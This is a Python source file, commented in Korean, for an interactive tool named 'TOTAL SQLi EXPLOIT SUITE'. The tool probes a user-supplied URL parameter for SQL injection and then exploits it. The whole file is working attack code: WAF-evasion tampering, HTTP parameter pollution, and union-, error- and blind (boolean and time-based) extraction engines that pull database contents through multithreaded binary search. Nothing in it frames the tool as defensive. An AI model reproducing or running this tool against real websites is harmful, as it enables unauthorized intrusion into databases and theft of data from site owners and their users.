#!/usr/bin/env python3
import requests
import sys
import time
import random
import re
import binascii
from tabulate import tabulate
from concurrent.futures import ThreadPoolExecutor, as_completed
import keyboard

# =========================
# 0. 고급 Tamper 엔진
# =========================
class TamperEngine:
    @staticmethod
    def obfuscate(payload, active=False):
        if not active: return payload
        payload = payload.replace(" ", "/**/")
        keywords = ["UNION", "SELECT", "FROM", "WHERE", "DATABASE", "AND", "OR", "INFORMATION_SCHEMA"]
        for kw in keywords:
            mixed = "".join(random.choice([c.upper(), c.lower()]) for c in kw)
            payload = re.sub(re.escape(kw), mixed, payload, flags=re.IGNORECASE)
        payload = payload.replace("=", "/**/LIKE/**/")
        return payload

# =========================
# 1. 고도화된 Stealth 네트워크 엔진
# =========================
class StealthNet:
    # 수정: target_param의 기본값을 문자열로 설정
    def __init__(self, method="GET", use_hpp=True, use_tamper=False, target_param="noticeId"):
        self.ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        ]
        self.method = method.upper()
        self.use_hpp = use_hpp
        self.use_tamper = use_tamper
        self.target_param = target_param 

    def send(self, url, payload_dict):
        headers = {
            'User-Agent': random.choice(self.ua_list),
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        processed_data = []
        for key, value in payload_dict.items():
            tampered_value = TamperEngine.obfuscate(value, self.use_tamper)
            if self.use_hpp:
                processed_data.append((key, "35")) 
                processed_data.append((key, tampered_value))
            else:
                processed_data.append((key, tampered_value))

        try:
            if self.method == "POST":
                return requests.post(url, data=processed_data, headers=headers, timeout=7)
            else:
                return requests.get(url, params=processed_data, headers=headers, timeout=7)
        except: return None

# =========================
# 2. 통합 취약점 진단 엔진
# =========================
class DiagnosticEngine:
    def __init__(self, url, net):
        self.url, self.net = url, net
        self.p = self.net.target_param

    def run(self):
        print(f"\n[*] Target: {self.url} ({self.net.method})\n[*] Attack Param: {self.p}\n[*] 진단 중...")
        results = []
        r = self.net.send(self.url, {self.p: "35'"})
        err = any(e in (r.text if r else "").lower() for e in ["sql syntax", "xpath", "mysql_fetch"])
        results.append(["Error-Based", "높음" if err else "낮음"])
        
        cols = 0
        for i in range(1, 15):
            if self.net.send(self.url, {self.p: f"35 ORDER BY {i}"}).status_code != 200:
                cols = i - 1; break
        results.append(["Union-Based", f"성공 ({cols} Cols)" if cols > 0 else "낮음"])
        
        r_t = self.net.send(self.url, {self.p: "35 AND 1=1"})
        r_f = self.net.send(self.url, {self.p: "35 AND 1=2"})
        blnd = (len(r_t.text if r_t else "") != len(r_f.text if r_f else "")) if (r_t and r_f) else False
        results.append(["Blind-Based", "가능" if blnd else "낮음"])
        
        print(tabulate(results, headers=["공격 유형", "가능성"], tablefmt="grid"))
        return {"error": err, "union_cols": cols, "blind": blnd}

# =========================
# 3. 공격 엔진 모듈
# =========================
class StealthUnionEngine:
    def __init__(self, url, col_count, stealth_net):
        self.url, self.col_count, self.net = url, col_count, stealth_net
        self.p = self.net.target_param
        self.data_column, self.magic_str = -1, "MONEY_TOM"
        self.hex_magic = "0x" + binascii.hexlify(self.magic_str.encode()).decode()

    def run(self):
        print(f"[*] Union 컬럼 탐색 중...")
        for i in range(1, self.col_count + 1):
            cols = ["NULL"] * self.col_count
            cols[i-1] = self.hex_magic
            # 수정: {"self.p": ...} 오타 수정 및 동적 키 적용
            r = self.net.send(self.url, {self.p: f"35 UNION SELECT {','.join(cols)}--"})
            if r and self.magic_str in r.text:
                self.data_column = i
                print(f"[+] 유효 데이터 컬럼: {i}번")
                break
        if self.data_column != -1: print(f"[+] DB Name: {self.get_db()}")

    def get_db(self):
        wrapped = f"CONCAT({self.hex_magic}, (DATABASE()), {self.hex_magic})"
        cols = ["NULL"] * self.col_count
        cols[self.data_column - 1] = wrapped
        r = self.net.send(self.url, {self.p: f"35 UNION SELECT {','.join(cols)}--"})
        m = re.findall(f"{self.magic_str}(.*?){self.magic_str}", r.text) if r else []
        return m[0] if m else "Unknown"

class ErrorBasedExploitEngine:
    def __init__(self, url, stealth_net):
        self.url, self.net = url, stealth_net
        self.p = self.net.target_param
        
    def run(self):
        print("[*] Error-Based 엔진 실행...")
        payload = f"EXTRACTVALUE(1, CONCAT(0x3a, (DATABASE())))"
        r = self.net.send(self.url, {self.p: f"35 AND {payload}"})
        if r:
            match = re.search(r"XPATH syntax error: ':(.*?)'", r.text)
            print(f"[+] DB Name: {match.group(1) if match else 'Failed'}")

class BlindExploitEngine:
    def __init__(self, url, stealth_net, mode="bool"):
        self.url, self.net, self.mode = url, stealth_net, mode
        self.p = self.net.target_param
        self.time_delay, self.max_workers = 3, 8
        self.true_indicator, self.skip_requested = None, False

    def check(self, condition):
        payload = f"IF(({condition}),SLEEP({self.time_delay}),0)" if self.mode == "time" else condition
        start = time.time()
        r = self.net.send(self.url, {self.p: f"35 AND {payload}"})
        if self.mode == "time": return (time.time() - start) >= self.time_delay
        return self.true_indicator in r.text if r and self.true_indicator else False

    def check_interrupt(self):
        if keyboard.is_pressed('ctrl+x'):
            print("\n[!] Ctrl+X 감지: 중단합니다.")
            self.skip_requested = True
            return True
        return False

    def extract_char(self, query, pos):
        if self.skip_requested: return chr(0)
        low, high, found_char = 32, 126, chr(0)
        while low <= high and not self.skip_requested:
            mid = (low + high) // 2
            if self.check(f"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"):
                low = mid + 1
                found_char = chr(low)
            else: high = mid - 1
        return found_char

    def run(self, query, max_len=32):
        self.skip_requested = False
        result = [""] * max_len
        print(f"[*] Blind 추출 시작 (Ctrl+X로 스킵): ", end="", flush=True)
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {executor.submit(self.extract_char, query, pos): pos for pos in range(1, max_len + 1)}
            for future in as_completed(futures):
                if self.check_interrupt():
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                pos, char = futures[future], future.result()
                if char != chr(0):
                    result[pos-1] = char
                    sys.stdout.write(char); sys.stdout.flush()
        print(f"\n[+] Extracted: {''.join(result).strip(chr(0))}")

# =========================
# 4. 통합 제어 시스템
# =========================
class IntegratedExploit:
    def __init__(self, url):
        self.url = url
        print("\n" + "="*40)
        m_choice = input("[?] 공격 메소드 (1: GET, 2: POST): ")
        method = "POST" if m_choice == '2' else "GET"
        self.param_name = input("[?] 파라미터명 (default: noticeId): ") or "noticeId"
        t_choice = input("[?] Tamper 활성화? (y/n): ").lower()
        
        self.net = StealthNet(method=method, use_tamper=(t_choice == 'y'), target_param=self.param_name)
        self.diag = DiagnosticEngine(url, self.net)

    def start(self):
        status = self.diag.run()
        print("\n[!] 공격 모드: 1:Union, 2:Error, 3:Blind(Bool), 4:Blind(Time), Q:Quit")
        choice = input("[Select] > ").strip()
        
        if choice == '1' and status['union_cols'] > 0:
            StealthUnionEngine(self.url, status['union_cols'], self.net).run()
        elif choice == '2' and status['error']:
            ErrorBasedExploitEngine(self.url, self.net).run()
        elif choice in ['3', '4']:
            mode = "bool" if choice == '3' else "time"
            engine = BlindExploitEngine(self.url, self.net, mode)
            if mode == "bool":
                engine.true_indicator = input("[?] True Indicator: ").strip()
            engine.run("SELECT DATABASE()")
        else: print("[!] 종료.")

if __name__ == "__main__":
    print("=== TOTAL SQLi EXPLOIT SUITE v6.0 (Final) ===")
    target = input("[?] Target URL: ").strip()
    if target: IntegratedExploit(target).start()
